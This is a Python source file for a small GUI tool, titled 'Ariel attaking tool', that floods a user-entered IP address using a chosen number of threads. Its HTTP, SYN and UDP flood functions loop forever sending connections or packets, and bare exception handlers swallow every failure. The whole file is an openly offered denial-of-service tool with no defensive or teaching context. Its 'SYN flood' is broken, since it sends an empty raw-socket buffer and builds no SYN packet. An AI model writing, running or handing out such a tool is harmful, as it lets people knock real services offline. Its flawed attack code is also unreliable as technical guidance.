import socket
import threading
import tkinter as tk
from tkinter import ttk

class AttackTool:
    def __init__(self, master):
        self.master = master
        self.master.title("Ariel attaking tool")

        self.target_label = ttk.Label(master, text="Enter the IP address of the target:")
        self.target_label.grid(row=0, column=0, sticky="w")
        self.target_entry = ttk.Entry(master)
        self.target_entry.grid(row=0, column=1)

        self.num_threads_label = ttk.Label(master, text="Enter the number of threads to use:")
        self.num_threads_label.grid(row=1, column=0, sticky="w")
        self.num_threads_entry = ttk.Entry(master)
        self.num_threads_entry.grid(row=1, column=1)

        self.attack_type_label = ttk.Label(master, text="Choose attack type:")
        self.attack_type_label.grid(row=2, column=0, sticky="w")
        self.attack_type_var = tk.StringVar()
        self.attack_type_combobox = ttk.Combobox(master, textvariable=self.attack_type_var, 
                                                 values=["HTTP Flood", "SYN Flood", "UDP Flood"])
        self.attack_type_combobox.grid(row=2, column=1)

        self.attack_button = ttk.Button(master, text="Launch Attack", command=self.launch_attack)
        self.attack_button.grid(row=3, columnspan=2)

    def launch_attack(self):
        target = self.target_entry.get()
        num_threads = int(self.num_threads_entry.get())
        attack_type = self.attack_type_var.get()

        if attack_type == "HTTP Flood":
            attack_func = self.http_flood
        elif attack_type == "SYN Flood":
            attack_func = self.syn_flood
        elif attack_type == "UDP Flood":
            attack_func = self.udp_flood

        threads = []
        for _ in range(num_threads):
            t = threading.Thread(target=attack_func, args=(target,))
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

    def http_flood(self, target):
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, 80))
                s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
                s.close()
            except:
                pass

    def syn_flood(self, target):
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.sendto(b'', (target, 0))
                s.close()
            except:
                pass

    def udp_flood(self, target):
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(b'', (target, 80))
                s.close()
            except:
                pass

def main():
    root = tk.Tk()
    app = AttackTool(root)
    root.mainloop()

if __name__ == "__main__":
    main()
